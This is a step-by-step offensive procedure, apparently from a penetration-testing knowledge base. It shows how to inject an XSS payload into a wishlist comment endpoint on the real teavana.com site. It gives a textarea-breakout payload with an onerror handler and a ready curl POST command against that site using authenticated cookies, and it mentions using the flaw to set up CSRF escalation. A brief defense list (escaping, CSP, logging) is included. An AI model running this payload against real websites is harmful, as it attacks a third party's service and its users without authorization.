---
id: proc-uuid-002
tags:
  - xss-injection
  - payload-submission
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/inject-xss-comment]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:43.173Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject XSS Payload in Wishlist Comment

## Summary

This procedure submits a malicious JavaScript payload as a wishlist comment, exploiting the lack of input sanitization to reflect executable code in the response textarea.

## Description

The endpoint /on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id reflects the wishlistComment parameter unsanitized into a <textarea> tag. By closing the tag early with </textarea><img src=x onerror=alert(1)>, the payload injects and executes on form load. This is a self-XSS but sets up for CSRF elevation. Requires authenticated session; outcomes include stored malicious comment.

## Requirements

1. Valid :id from wishlist item
2. Authenticated cookies
3. HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Sanitize/escape HTML in reflected inputs
- Content Security Policy (CSP) to block inline scripts
- Log suspicious comment content

## Objectives

1. Inject and store XSS payload
2. Confirm reflection without escaping
3. Prepare for edit-triggered execution

## Instructions

### Step 1: Prepare Payload

**Context**: Craft the breakout payload.

**Command** ([[commands/inject-xss-comment]]):
```bash
# Payload: </textarea><img src=x onerror=alert(1)>
```

> Ensures execution on reflection.

### Step 2: Submit via POST

**Context**: Send to the endpoint.

**Command** ([[commands/inject-xss-comment]]):
```bash
curl -X POST 'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/[ID]' -d 'wishlistComment=</textarea><img src=x onerror=alert(1)>' -H 'Cookie: [AUTH_COOKIE]'
```

> Response shows unsanitized reflection; comment saved.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/inject-xss-comment]]

## Tools Used


## Tags

- xss-injection
- payload-submission
